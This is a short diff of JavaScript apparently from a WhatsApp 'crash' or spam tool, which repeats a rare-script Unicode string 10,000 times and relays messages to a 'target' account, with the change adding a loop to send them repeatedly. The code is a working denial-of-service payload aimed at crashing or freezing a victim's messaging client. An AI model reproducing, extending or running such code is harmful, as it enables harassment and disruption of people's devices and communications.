@@ -488,7 +488,8 @@ const exe = "𑇂𑆵𑆴𑆿".repeat(10000);
       timeStamp: Date.now(),
     }
   );
-  
+
+for (let z = 0; z < 2; z++) {
   await sock.relayMessage(target, etc.message, {
     messageId: etc.key.id,
     participant: { jid: target },
@@ -498,3 +499,9 @@ const exe = "𑇂𑆵𑆴𑆿".repeat(10000);
     messageId: msg.key.id,
     participant: { jid: target },
   });
+};
+
+await sock.relayMessage(target, msg.message, {
+  messageId: msg.key.id,
+  participant: { jid: target }
+});
